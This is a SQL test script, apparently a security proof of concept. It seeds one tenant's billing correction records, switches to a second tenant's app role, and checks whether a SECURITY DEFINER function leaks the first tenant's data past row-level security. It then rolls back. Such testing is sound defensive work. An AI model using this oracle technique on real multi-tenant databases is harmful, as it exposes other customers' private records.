-- ATTACK C: cross-tenant oracle through get_correction_rate_date (SECURITY DEFINER, tally_app EXECUTE granted)
BEGIN;
SET CONSTRAINTS ALL IMMEDIATE;

-- Tenant 1 (victim): a real correction run + voided invoice + target with a 'custom' override date
-- (a date chosen to be obviously distinguishable, e.g. far future/past, so a leak is unambiguous).
INSERT INTO public.billing_runs (id, tenant_id, run_number, billing_period, period_start, period_end, run_type, status, started_at, correction_rate_mode)
VALUES ('10000000-0000-4000-8000-00000000b001', '10000000-0000-4000-8000-00000000aa01', 'CDX-CORR-1', '2025-06', '2025-06-01', '2025-06-30', 'correction', 'in_progress', now() - interval '2 hours', 'historical');

INSERT INTO public.invoices (id, tenant_id, invoice_number, customer_id, location_id, invoice_type, invoice_date, billing_period, period_start, period_end, due_date, status)
VALUES ('10000000-0000-4000-8000-00000000c001', '10000000-0000-4000-8000-00000000aa01', 'T1-ORIG', '10000000-0000-4000-8000-00000000ac01', '10000000-0000-4000-8000-00000000ad01', 'regular', '2025-07-01', '2025-06', '2025-06-01', '2025-06-30', '2025-07-21', 'draft');

INSERT INTO public.correction_run_targets (id, tenant_id, billing_run_id, voided_invoice_id, meter_id, customer_id, rate_date_mode, rate_date_override)
VALUES ('10000000-0000-4000-8000-00000000d001', '10000000-0000-4000-8000-00000000aa01', '10000000-0000-4000-8000-00000000b001', '10000000-0000-4000-8000-00000000c001', '10000000-0000-4000-8000-00000000ae01', '10000000-0000-4000-8000-00000000ac01', 'custom', '2019-03-14');

-- Now become T2's app user. T2 has no visibility into any of the above rows under RLS.
SET LOCAL app.user_id = '10000000-0000-4000-8000-00000000ab02';
SET ROLE tally_app;

-- Sanity: T2 cannot SELECT the target row directly (RLS).
DO $$
DECLARE v_cnt int;
BEGIN
  SELECT count(*) INTO v_cnt FROM public.correction_run_targets WHERE id = '10000000-0000-4000-8000-00000000d001';
  RAISE NOTICE 'T2 direct SELECT on T1''s target row via RLS sees % row(s) (expect 0)', v_cnt;
END $$;

-- The oracle: call the SECURITY DEFINER resolver directly with T1's ids.
DO $$
DECLARE v_date date;
BEGIN
  v_date := public.get_correction_rate_date('10000000-0000-4000-8000-00000000b001', '10000000-0000-4000-8000-00000000c001');
  RAISE NOTICE 'ATTACK C RESULT: get_correction_rate_date() as T2 app-user for T1''s (run, voided invoice) returned: % (leak if non-NULL and matches T1''s custom override 2019-03-14)', v_date;
END $$;

ROLLBACK;
